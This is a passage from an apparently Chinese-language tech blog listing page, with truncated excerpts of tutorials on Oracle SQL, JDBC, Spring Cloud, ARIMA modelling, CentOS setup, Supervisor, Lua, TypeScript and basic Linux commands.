DBMS_METADATA.GET_DDL ( object_type IN VARCHAR2, name IN VARCHAR2, schema IN VARCHAR2 DEFAULT NULL, version IN VARCHAR2 DEFAULT 'COMPATIBLE', model IN VARCHAR2 DEFAULT 'ORACLE', transform IN VARCHAR2 DEFAULT 'DDL') RETURN CLOB; 以下为常用DDL查询 TABLESPACE 查询CHAICHENG表空间的定义语句
SELECT DBMS_METADATA.GET_DDL('TABLESPACE','CHAICHENG') FROM DUAL; USER 查询CHAICHENG用户用户的定义语句
SELECT DBMS_METADATA.GET_DDL('USER','CHAICHENG') FROM DUAL; TABLE 查询CHAICHENG用户下TEST表的定于语句
SELECT DBMS_METADATA.GET_DDL('TABLE','TEST','CHAICHENG') FROM DUAL; VIEW 查询CHAICHENG用户下V_TEST视图的定于语句
SELECT DBMS_METADATA.GET_DDL('VIEW','V_TEST','CHAICHENG') FROM DUAL; INDEX 查询CHAICHENG用户下TEST_INDEX01索引的定于语句
SELECT DBMS_METADATA.GET_DDL('INDEX','TEST_INDEX01','CHAICHENG') FROM DUAL; SYNONYM 查询CHAICHENG用户下公共和私有的同义词定义语句
SELECT DBMS_METADATA.GET_DDL('SYNONYM','TEST_1','PUBLIC') FROM DUAL; SELECT DBMS_METADATA.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ad8b4de78b137961b69d8d3e9517f24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c405a9b76fcc889817301ddcbf2b00e7/" rel="bookmark">
			【计算机网络】距离向量算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决更新路由表的问题
针对RIP讨论
路由表数据结构 目标网络距离下一跳 算法步骤 路由器X发送路由表给路由器Y，现在确定Y的新路由表
接到邻居节点的路由表，先把全部table-item的下一跳改为发送方X。并将距离+1。对于Y来说X的路由表中的距离都应该是先到X再到目的地，所以应该+1。对于X的路由表的每个table-item来说，如果Y中不存在就append；如果存在而且下一跳相同，则更新（要与时俱进）。如果下一跳不同，如果距离更短就换成更短的那条路（近路）。其他情况是下一跳不同，而且距离更长，显然不选择，continue。3min每收到，距离改为16（不可达）。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03b5869b9d444d97343a4167c53ba1cd/" rel="bookmark">
			Java基础之JDBC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
实现代码
参数
PreparedStatement批量处理
prepareStatement与Statement
实现代码 Connection connection = null; PreparedStatement preparedStatement = null; try { Class.forName(driver); connection = DriverManager.getConnection(url, username, password); preparedStatement = connection.prepareStatement(sql); preparedStatement.setString(1,""); ResultSet resultSet =preparedStatement.executeQuery(); while (resultSet.next()){ } }catch (ClassNotFoundException e){ } catch (SQLException e){ } 参数 driver_Hive = "jdbc:hive2://10.16.2.62:10000/default"; url_Hive_Spark = "jdbc:hive2://10.16.2.61:10016/default"; driver_MPP = "com.gbase.jdbc.Driver"; url_MPP = "jdbc:gbase://10.16.1.193:5258/bigtabletest"; driver_Oracle = "oracle.jdbc.driver.OracleDriver"; url_Oracle = "jdbc:oracle:thin:@10.16.3.16:1521:orcl"; driver_Mysql = "com.mysql.jdbc.Driver"; url_Mysql = "jdbc:mysql://localhost:3306/samp_db"; PreparedStatement批量处理 Connection con = null; PreparedStatement pstm = null; try { // 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03b5869b9d444d97343a4167c53ba1cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29449cf680b2f59f9a95ebe9a58d9608/" rel="bookmark">
			SecureCRT日志上添加时间戳
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先成功使用secureCRT打印串口信息
2.打开option菜单的session options对话框
3.点击LogFile选项，输入log文件路径和名字，最后在log data输入 %Y%M%D_%h:%m:%s:%t:
最后点击OK。
4.在File菜单下的Log Session选项勾上，这样串口打印的信息就会记录在你配置的路径中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e278ab502cf11814d28ac0ad473028f2/" rel="bookmark">
			【numpy】查询手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		所有函数见：
函数查询中文.
函数查询
以下重点写常用到的一些函数：
正态分布 f ( x ) = 1 2 π σ e x p ( − ( x − μ ) 2 2 σ 2 ) f(x)=\frac{1}{2\pi\sqrt σ} exp(− \frac{(x−μ)^2}{2 σ^2}) f(x)=2πσ ​1​exp(−2σ2(x−μ)2​)
#从某一分布（由均值和标准差标识）中获得样本 mu, sigma = 0, .1 s = np.random.normal(loc=mu, scale=sigma, size=1000) 或者可以
import scipy.stats as st mu, sigma = 0, .1 s = st.norm(mu, sigma).rvs(1000) 可以作图
画出曲线
import seaborn as sns sns.distplot(s) 画直方图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e278ab502cf11814d28ac0ad473028f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a7eb52265c51eae410503132894785f/" rel="bookmark">
			怎么做网站，网站制作步骤有哪些？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在很多个人和企业都想自己做网站，通过网站来宣传企业或产品，但不知道怎么下手？其实呢网站建设不是想象那么复杂，首先你要想好网站内容方案，要做什么样的网站。有了大致网站内容方案后按照网站制作流程操作就可以完成了，熟悉建站步骤后，很快就能制作一个网站出来，下面来给第一次建站的朋友们讲一下建站步骤。
第一步、域名注册 做网站最起码需要一个网址，也就是域名，注册域名的网站很多，注册价格也不一样，不同注册商提供的服务不一样。目前域名注册需要实名认证，不同注册商步骤上稍有差异，具体操作可以联系注册商客服人员。阿里云，西部数码等都可以注册
第二步、服务器购买 服务器是用来放网站文件的。便宜点的叫虚拟主机（或网站空间），服务器分为ASP、PHP、NET，三种类型。第一次建站对网站空间类型不了解，不过没有关系，我们可以选择全能型空间。它支持ASP、PHP、NET三种程序。网站空间购买后，可以通过空间自带一个子域名地址访问到空间一个默认页面。
第三步、网站备案 在国内的所有网站都需要备案后才能上线，没有备案的网站不允许，买完空间后需要做的是备案，备案需要自己联系空间商，把备案资料提交给空间商，然后他们再提交给工信部审核，工信部审核通过后下发备案号，备案审核会在20个工作日完成。一般情况只要几个工作日就会通过。如果你不备案可以使用免备的空间，免备案的空间服务器不在大陆，服务器在香港或国外，但是打开速度会慢
第四步、上传网站系统 网上有很多专门用于做网站的网站程序，当然也有很多不能用的，或者功能差，安全差的程序，所以不要乱用，要选择哪种比较出名的，如果做论坛可以用discuz系统；做博客可以用Z-blog系统；企业、学校、政府这类通用网站可以用pageadmin系统；购物网站可以用ecshop系统、这些系统都是可以免费下载的，都是国内很出名，功能成熟，安全性很好的网站程序，根据自己的网站来选择系统。把下载好的系统文件上传到网站空间，网站备案还没有通过，不能使用域名访问网站，但我们可以使用服务器自带的测试地址进行程序安装，上传后，按照安装步骤操作就可以了。安装包里有安装说明。如果自己不会安装可以让空间商帮你安装。
第五步、添加网站内容 我们可以在备案期间来完成网站内容添加，添加网站内容也是比较简单，进入网站后台新建网站栏目，自己需要几个栏目就建几个，具体操作参考相应的程序操作手册。
第六、解析域名和绑定域名 备案号后通过我就可以把域名解析到空间IP上了，域名解析完成后，再在空间的管理面板上把解析好的域名绑定。在地址栏输入你的域名。就可以访问到你的网站。如果不能马上访问，先别急，可能是解析没有生效，稍等一会域名生效后就可以访问了。自己建站就这么简单。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaf34f28cb8fd9961cca435f1756f87b/" rel="bookmark">
			网格布局中 grid-column-start, grid-column-end 和 grid-row-start, grid-row-end
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		grid-column-start, grid-column-end 和 grid-row-start, grid-row-end 通过指定特定网格线(grid lines) 来确定 网格项(grid item) 在网格中的位置和大小。 grid-column-start / grid-row-start 是网格项开始的网格线，grid-column-end / grid-row-end 是网格项结束的网格线。
值：
&lt; line &gt;：如果是数字则表示网格线的编号，如果是名称则表示网格线的名称span &lt; number &gt;：网格项将跨越的网格轨道数量span &lt; name&gt;：网格项将跨越到指定的名称位置auto：表示自动放置，自动跨度，默认会跨一个网格轨道的宽度或者高度 CSS 代码:
.item { grid-column-start: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto grid-column-end: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto grid-row-start: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto grid-row-end: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto } [&lt; integer &gt;&amp;&amp;&lt; custom-ident &gt;?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aaf34f28cb8fd9961cca435f1756f87b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c074d4ab09ddc189d9096c20aed3e9fc/" rel="bookmark">
			新 Spring Cloud (三) 之 Hystrix熔断保护
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 零、 前言0. 之前写过两篇Spring Cloud，但是感觉不够具体，所以重新写了一份。 一、简介1. Hystrix设计原则2. 雪崩问题3. 线程隔离、服务降级4. 服务熔断 二、项目实践1. 线程隔离、服务降级1. 针对单一方法的熔断2. 针对类的熔断 2. 服务熔断 零、 前言 0. 之前写过两篇Spring Cloud，但是感觉不够具体，所以重新写了一份。 新 Spring Cloud (一) 之 Eureka 服务注册中心
新 SpringCloud (二) 之 Ribbon 负载均衡
新 Spring Cloud (三) 之 Hystrix熔断保护
新 Spring Cloud (四) 之 Fegin远程调用
新 Spring Cloud (五) 之 Zuul 网关
一、简介 Hystrix,英文意思是豪猪，是一种保护机制。Hystrix也是Netflix公司的一款组件。Hystix是Netflix开源的一个延迟和容错库，用于隔离访问远程服务、第三方库，防止出现级联失败。
1. Hystrix设计原则 防止单个服务的故障，耗尽整个系统服务的容器（比如tomcat）的线程资源，避免分布式环境里大量级联失败。通过第三方客户端访问（通常是通过网络）依赖服务出现失败、拒绝、超时或短路时执行回退逻辑用快速失败代替排队(每个依赖服务维护一个小的线程池或信号量，当线程池满或信号量满，会立即拒绝服务而不会排队等待)和优雅的服务降级；当依赖服务失效后又恢复正常，快速恢复提供接近实时的监控和警报，从而能够快速发现故障和修复。监控信息包括请求成功，失败（客户端抛出的异常），超时和线程拒绝。如果访问依赖服务的错误百分比超过阈值,断路器会跳闸，此时服务会在一段时间内停止对特定服务的所有请求将所有请求外部系统（或请求依赖服务）封装到HystrixCommand或HystrixObservableCommand对象中，然后这些请求在一个独立的线程中执行。使用隔离技术来限制任何一个依赖的失败对系统的影响。每个依赖服务维护一个小的线程池（或信号量），当线程池满或信号量满，会立即拒绝服务而不会排队等待 2. 雪崩问题 1. 介绍
在微服务架构中，服务之间的调用错综复杂，一个请求可能需要多个微服务接口才能实现，形成非常复杂的调用链路。
如图，一次业务请求，需要调用A、P、H、I四个服务，这四个服务又可能调用其它服务。
如果此时，某个服务出现异常：
例如微服务I发生异常，请求阻塞，用户不会得到响应，则tomcat的这个线程不会释放，于是越来越多的用户请求到来，越来越多的线程会阻塞：
服务器支持的线程和并发数有限，请求一直阻塞，会导致服务器资源耗尽，从而导致所有其它服务都不可用，最后导致整个系统崩溃不可用，形成雪崩效应。
比如：
2. 解决方案
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c074d4ab09ddc189d9096c20aed3e9fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ede86bd1e7413099da2bb34fd844443/" rel="bookmark">
			预测分析 Python ARIMA模型预测（学习笔记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import numpy as np import pandas as pd import matplotlib.pyplot as plt import statsmodels.api as sm #读取数据 data=pd.read_excel("data_test.xls",index_col=0) data=data['number'] data.plot(figsize=(12,8)) #原图 #数据带有周期性，先一阶差分，再144步差分 diff_1=data.diff(1) diff1=diff_1.dropna() diff1_144_1=diff_1-diff_1.shift(144) diff1_144=diff1_144_1.dropna() #画图判断是否平稳 fig=plt.figure(figsize=(12,8)) ax=fig.add_subplot(111) diff1_144.plot(ax=ax) #求差分序列的自相关图ACF和偏自相关图PACF fig=plt.figure(figsize=(12,8)) ax1=fig.add_subplot(211) fig=sm.graphics.tsa.plot_acf(diff1_144,lags=40,ax=ax1) ax2=fig.add_subplot(212) fig=sm.graphics.tsa.plot_pacf(diff1_144,lags=40,ax=ax2) plt.show() #模型定阶，根据aic、bic、hqic，三者都是越小越好 arma_mod01=sm.tsa.ARMA(diff1_144,(0,1)).fit() print(arma_mod01.aic,arma_mod01.bic,arma_mod01.hqic) arma_mod10=sm.tsa.ARMA(diff1_144,(1,0)).fit() print(arma_mod10.aic,arma_mod10.bic,arma_mod10.hqic) arma_mod60=sm.tsa.ARMA(diff1_144,(6,0)).fit() print(arma_mod60.aic,arma_mod60.bic,arma_mod60.hqic) arma_mod61=sm.tsa.ARMA(diff1_144,(6,1)).fit() print(arma_mod61.aic,arma_mod61.bic,arma_mod61.hqic) 8782.801951424293 8795.000275694605 8787.618254792987
8781.294547949288 8793.4928722196 8786.110851317982
8761.522020813209 8794.05088553404 8774.365496463062
8758.668160226449 8795.263133037382 8773.117070332533
#模型定为ARMA(6,1) #计算残差 resid=arma_mod61.resid #模型检验 #残差的acf和pacf fig=plt.figure(figsize=(12,8)) ax1=fig.add_subplot(211) fig=sm.graphics.tsa.plot_acf(resid.values.squeeze(),lags=40,ax=ax1) #squeeze()数组变为1维 ax2=fig.add_subplot(212) fig=sm.graphics.tsa.plot_pacf(resid,lags=40,ax=ax2) plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ede86bd1e7413099da2bb34fd844443/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/666a7ebc5338e692f8f5e6f536bdb579/" rel="bookmark">
			springboot学习：从数据库中获取数据并展示于网页内的两种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 记录学习，随时更改。
两种方法：
常规方法：Jpa访问数据库拿到值后，写入域中，thymeleaf从域中拿值，然后修改标签的值。
用于echarts：由于echarts的所有配置都写在js代码内，所以上述java的实现不可行，采用Ajax轮询的方式访问配置的“@RestController”，拿到返回的查询结果，经过处理后写入图表配置。
方法一 看代码示例：
@RequestMapping("/watermonitor") //访问某url时 public String water(Model model) { Kepwater kepwater=kepwaterRepository.findById(1); //读出数据表内第一行数据 if(kepwater==null){ System.out.println(11); }else model.addAttribute("kepwater",kepwater);//若不为空，写入域内 return "watermonitor"; //跳到"watermonitor.html" } 然后thymeleaf拿值，写入html：（部分代码）
&lt;div th:text="${kepwater.value}" style="font-size: 30px;text-align: center"&gt;100&lt;/div&gt; 方法二 配置时就不用“@Controller”了，而用“@RestController”,因为现在不返回页面而是返回查询结果。
@RestController @RequestMapping("/oee") public class oeeController { @Autowired private cn.edu.cims.sunwa.repository.oeeRepository oeeRepository; @RequestMapping("/listAll") public String oeeAll(){ List&lt;oee&gt; list = oeeRepository.findAll(); String str = JSON.toJSONString(list); return str; } } 接下来看对应的JS代码：
简介：定时访问上述配置的“/oee/listAll”,将每一条查询结果的“month”值和“value”值push入两个数组（数据表表头是“id”，“month”，“value”），这里我就直接相应定义了month和value数组（因为echarts配置中，“data”参数是数组，所以需要将单个的值分别push入数组）。
代码有点长，但其实基本上都是echarts配置，真正的逻辑在get函数内，很简单。
&lt;script type="text/javascript"&gt; // 基于准备好的dom，初始化echarts实例 var myChart = echarts.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/666a7ebc5338e692f8f5e6f536bdb579/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/471bd1b438e7babe67a9cdb435c69bdd/" rel="bookmark">
			Linux安装（CentOS7）与最小化安装配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux安装（CentOS7）与最小化安装配置 一、CentOS7安装（最小化）
1、安装VMware（虚拟机软件）
这里安装的是VMware15.5（2019年10月份之前的版本无法开启重装了下），使用默认配置（一直下一步，最多安装位置我这里设置成了D盘），VMware可以在百度搜索下载，如官网：https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html；
2、准备CentOS7镜像
一般网上会有下载的镜像，我也是在其他地方找下载的，这里不做链接（主要是镜像太大网盘没能上传）；
3、新建虚拟机
（1）首先虚拟机欢迎界面配置向导选择“自定义（高级）”，如图所示。
（2）之后选择虚拟机硬件兼容性，默认配置，点击下一步；
（3）安装客户机操作系统界面，选择“稍后安装操作系统”，如何所示。
（4）配置客户机操作系统版本，选择“ContOS7”;
（5）配置客户机安装位置和客户机名称；
（6）配置客户机的处理器，如2核；
（7）配置虚拟机的内存，一般安照默认配置即可，当然也可选择配置，一般不能超过提示的最大推荐内存，我这里寻找了2G（备注：后续这个参数是可以修改的）；
（8）网络类型选择，一般默认配置就可，除非你有自己的要求，我这里选择默认。
（9）I/O控制器类型、磁盘类型和选择磁盘选择虚拟机的推荐选项，默认进行下一步；
（10）磁盘容量，一般配置50GB就够了，虚拟文件选择默认拆分多个，如下图所示，最后按照默认配置完成新建空的虚拟机。
（11）编辑虚拟机设置，选择配置镜像来源（选择下下来的CentOS7镜像文件）；
（12）开启虚拟机进行初步安装等待进行安装过程中语言选择界面，选择中文；
（13）时间选择按照本地进行配置；
（14）键盘、语言支持和安装介质默认，软件选择（初学者可以配置带有桌面的），我这里默认选择配置最小安装，勾选所以的附加配置；
（15）分区配置，手动分区（注意：Linux里主分区最多只能有4个，扩展分区在一个硬盘里最多只有一个），选择标准分区，建立第一个分区（启动分区）：/boot，大小一般200M以上，我选择400M；之后就是配置“根”分区（即根目录），所以容量需要足够大，我分配40G；接下来再分一个swap分区（交换分区），它是硬盘上做的是内存工作的空间，一般为设置内存的1.5~2倍，但不要超过8G，我一般设置为4G，其余暂留；
（16）分区配置完后设置网络（一般要开启网络）；
（17）点击安装，配置root用户密码等待安装完成，最后重启进入；
** 二、最小化安装后续配置**
1、登录root账号，验证网络配置
命令行：ifconfig；提示：not found，表示没有此命令；
2、安装初始设置工具
最小化的CentOS7系统是没有安装 nano 、 vim 、 wget 、 curl 、 ifconfig 、 lsof 、 zip、unzip命令，因此这里需要安装一下（命令解释：nano是一个字符终端的文本编辑器，比vi/vim要简单得多，比较适合Linux初学者使用； vim 是多模式编辑器；wget是一个下载文件的工具；curl是一个利用URL规则在命令行下工作的文件传输工具；ifconfig是linux中用于显示或配置网络设备（网络接口卡）的命令；lsof(list open files)是一个列出当前系统打开文件的工具；zip、unzip是压缩和解压缩命令工具 ）：
命令行：yum -y install nano vim wget curl net-tools lsof zip unzip
安装完成后提示：
3、配置虚拟机的 ip设置（使用静态 ip）
（1）查看显示路由信息，路由表命令：netstat -rn
（2）查看网卡的信息，查看命令：ip addr 或者 ifconfig -a
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/471bd1b438e7babe67a9cdb435c69bdd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83139387ba2443db6f38ed686220910d/" rel="bookmark">
			oracle常用命令行&lt;2&gt;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/申明：该文章为自己学习时查漏补缺所用，不足之处请见谅。/
—视图
—视图的概念：视图就是提供一个查询的窗口，所有数据来自于原表。
—查询语句创建表
create table emp as select * from scott.emp;
select * from emp;
—创建视图【必须有dba权限】
create view v_emp as select ename, job from emp;
—查询视图
select * from v_emp;
—修改视图[不推荐]
update v_emp set job=‘CLERK’ where ename=‘ALLEN’;
commit;
—创建只读视图
create view v_emp1 as select ename, job from emp with read only;
—视图的作用？
—第一：视图可以屏蔽掉一些敏感字段。
—第二：保证总部和分部数据及时统一。
—索引
–索引的概念：索引就是在表的列上构建一个二叉树
----达到大幅度提高查询效率的目的，但是索引会影响增删改的效率。
—单列索引
—创建单列索引
create index idx_ename on emp(ename);
—单列索引触发规则，条件必须是索引列中的原始值。
—单行函数，模糊查询，都会影响索引的触发。
select * from emp where ename=‘SCOTT’
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83139387ba2443db6f38ed686220910d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70e24f0041827ce33a6639ec9a5b6e26/" rel="bookmark">
			Lua的学习-4-Table 表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Table 表的初始化 Lua的Table表涵盖了 集合，数组，可变数组，哈希（键值对）
1、初始化-数组下标方式
Lua的下标从 1 开始
--声明（按照数组方式） --结果：len = 3,3，5，7 a = {3,5,7} len = #a p'rint("len = "..len) for i = 1,len do print(a[i]) end 通过 #a 的方式获取长度是不准确的，特别是在table的元素中有两个nil，并且以nil为结尾时，这时可以通过table.maxn()方式
--结果len =7 ,末尾的nil 代表table的结束；如果采用的是#a,则此处结果为3 a = {3,5,7,nil,"a","b","c",nil} len = table.maxn(a) print("len="..len) --结果：len=9 b = {3,5,7,nil,"a","b","c",nil} b[9] = 78 len table.maxn(b) 从上可知，table的特性：
table是可变数组，可以增加其元素；table内部元素可以多类型；下标从1开始
如果一定要下标从0开始，可以用下面方法，但不推荐，很多标准库不能使用。
c = {[0]=3,5,7,nil,"a","b","c",nil} 2、初始化-键值对方式
声明 按照键值对方式
a = {x = 3,y=5,z="hello"} a["n"] = "nnn" a.m = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70e24f0041827ce33a6639ec9a5b6e26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b5a8d02c8779191bc0d627d0900c192/" rel="bookmark">
			数组根据某字段进行分组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;?php // 数据$arr从别人哪里copy的，废话不多说，拿去运行吧 $arr = Array( 0 =&gt; Array ( 'title' =&gt; '新闻投票分成', 'gold' =&gt; +0.004095, 'create_time' =&gt; 1545355432, 'create_date' =&gt; 20181221, ), 1 =&gt; Array ( 'title' =&gt; '新闻投票分成', 'gold' =&gt; +0.002801, 'create_time' =&gt; 1545355432, 'create_date' =&gt; 20181221, ), 2 =&gt; Array ( 'title' =&gt; '持币分红', 'gold' =&gt; +0.837871, 'create_time' =&gt; 1545194334, 'create_date' =&gt; 20181219, ) ); // 按照日期进行分组 function arrayGroup($arr) { foreach ($arr as $key =&gt; $value) { $newArr[$value['create_date']][] = $value; } return $newArr; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7150ebdf240f80a8549cab3343a332d6/" rel="bookmark">
			Supervisor的简易用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 Supervisor（http://supervisord.org/）C/S架构的进程控制系统,是用Python开发的一个client/server服务，是Linux/Unix系统下的一个进程管理工具，基于linux操作系统的一款服务器管理工具，不支持Windows系统。
用以监控服务器的运行，发现问题能立即自动预警及自动重启等功能。
Supervisor类似于monit，
monit和supervisor的一个比较大的差异是supervisor管理的进程必须由supervisor来启动，
monit可以管理已经在运行的程序；
supervisor还要求管理的程序是非daemon程序，supervisord会帮你把它转成daemon程序，
因此如果用supervisor来管理nginx的话，必须在nginx的配置文件里添加一行设置daemon off让nginx以非daemon方式启动。
因为Supervisor是Python开发的，安装前先检查一下系统否安装了Python2.4以上版本。下面以CentOS7，Python2.7版本环境下，介绍Supervisor的安装与配置步聚：
下载supervisor的网址：
https://pypi.python.org/pypi/supervisor/ wget https://pypi.python.org/packages/31/7e/788fc6566211e77c395ea272058eb71299c65cc5e55b6214d479c6c2ec9a/supervisor-3.3.3.tar.gz 安装supervisor
easy_install supervisor supervisor安装完成后会生成三个执行程序：
1.supervisortd : supervisor的守护进程服务（用于接收进程管理命令）
2.supervisorctl : 客户端（用于和守护进程通信，发送管理进程的指令）
3.echo_supervisord_conf : 生成初始配置文件程序。
配置 运行supervisord服务的时候，需要指定supervisor配置文件，如果没有显示指定，默认在以下目录查找：
$CWD/supervisord.conf $CWD/etc/supervisord.conf /etc/supervisord.conf /etc/supervisor/supervisord.conf (since Supervisor 3.3.0) ../etc/supervisord.conf (Relative to the executable) ../supervisord.conf (Relative to the executable) $CWD表示运行supervisord程序的目录。
可以通过运行echo_supervisord_conf程序生成supervisor的初始化配置文件，如下所示：
mkdir -p /etc/supervisor/conf.d echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf 配置文件参数说明
supervisor的配置参数较多，下面介绍一下常用的参数配置，详细的配置及说明，请参考官方文档介绍。
注：分号（;）开头的配置表示注释
[unix_http_server] file=/tmp/supervisor.sock ;UNIX socket 文件，supervisorctl 会使用 ;chmod=0700 ;socket文件的mode，默认是0700 ;chown=nobody:nogroup ;socket文件的owner，格式：uid:gid ;[inet_http_server] ;HTTP服务器，提供web管理界面 ;port=127.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7150ebdf240f80a8549cab3343a332d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89fa3c7ef20b6cfc1520c50b3884546a/" rel="bookmark">
			TypeScript类型怎么写？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		* 1.1 ts 如何声明一个boolean, number, string类型的值 */ // 在js中，定义 isFlag 为true, 但是后面还可以重新给它赋值为字符串，而ts中就不行，同理，声明number, string 也一样 let bool: boolean = true; // 会报错：不能将类型“"str"”分配给类型“boolean”。 // isFlag = "str" let str: string = "a"; // 会报错：不能将类型“1”分配给类型“string”。 // str = 1 let num: number = 1; // 会报错：不能将类型“"a"”分配给类型“number”。 // num = "a" /** * * * * 1.2 ts 如何声明一个 undefined, null 类型的值 */ let u: undefined = undefined; let n: null = null; /** * * * * 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89fa3c7ef20b6cfc1520c50b3884546a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9fdda1ae2bfa03b1c13dc8b548a1acd/" rel="bookmark">
			layui 列表文字鼠标经过显示全部信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 {title: "商品名称", templet: "#goodTitle",align: "center", width: width * 0.1}, &lt;script type="text/html" id="goodTitle"&gt; {{# if(d.goodTitle != ""){ }} &lt;span style="cursor: pointer; width: 150px;text-overflow: ellipsis;overflow: hidden;display: block;" id='goodTitleMsg'&gt;{{d.goodTitle}}&lt;input type='hidden' value="{{d.goodTitle}}"/&gt;&lt;/span&gt; {{# } }} &lt;/script&gt; var tip_index = 0; $(document).on('mouseover', '#goodTitleMsg', function(data){ var details = data.currentTarget.lastChild.defaultValue; if(details!=""){ tip_index = layer.tips("&lt;span style='font-size:13px;line-height:20px;'&gt;"+details+"&lt;/span&gt;", ($(this)),{ tips: [3, '5CBA59'],time:0,time:0,area: ['200px']}); } }).on('mouseleave', '#goodTitleMsg', function(){ layer.close(tip_index); }); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36607554d16c695d8ba995a97b811146/" rel="bookmark">
			linux基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、别名：alias
格式：alisa 别名=‘系统认可的命令‘
alias jsh=‘ls -lah’
jsh就可以执行ls –lah的命令
unalias取消别名
unalias jsh
2、树形目录
tree –L n [目录]，其中n指定目录深度
3、拷贝目录
cp -r源目录 目标目录
4、移动目录：mv
mv [要移动目录][目标目录]
重命名：
5、正序查看文件内容:cat
cat -An :展示出行，每行最后以$结束
6、grep:在文件中搜寻字符串匹配的行并输出，多个文件以空格隔开。
-i不区分大小写
-v排除指定字符串
-c输出符合条件的行的个数
-E 以正则表达式的方式搜索
-F 以普通文本的方式搜索
-n 显示搜索到的内容在文件中的行号。
7、locate a.txt 在全局范围内查找文件名包含a.txt的文件
8.grep :是一种强大的文本搜索工具，他能使用正则表达式搜索文本，并把匹配的行统计出来
grep ‘page_name’ madian.txt
在maidian.txt文件中查找包含page_name的行
8、sed
sed叫做流编辑器，在shell脚本和Makefile中作为过滤一使用非常普遍，也就是把前一个程序的输出引入sed的输入，经过一系列编辑命令转换成为另一种格式输出。sed是一种在线编辑器，它一次处理一行内容，处理时，把当前处理的行存储在临时缓冲区中，称为"模式空间",接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有改变，除非你使用重定向存储输出。
